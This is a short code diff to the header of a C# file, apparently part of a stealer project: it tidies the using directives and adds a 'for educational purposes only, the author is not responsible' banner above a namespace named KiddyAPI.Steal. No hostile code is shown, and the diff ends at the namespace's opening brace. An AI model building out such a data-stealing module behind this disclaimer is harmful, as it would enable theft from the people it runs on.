@@ -1,10 +1,11 @@
-﻿using System;
-using System.Collections.Generic;
+﻿/////////////////////////////////////////////////////////
+//// Developer : Whiro
+//// For for educational purposes
+//////////////////////////////////////////////////////////
+using System;
 using System.Diagnostics;
 using System.IO;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
+
 //     | For educational purposes only, the author is not responsible.
 namespace KiddyAPI.Steal
 {
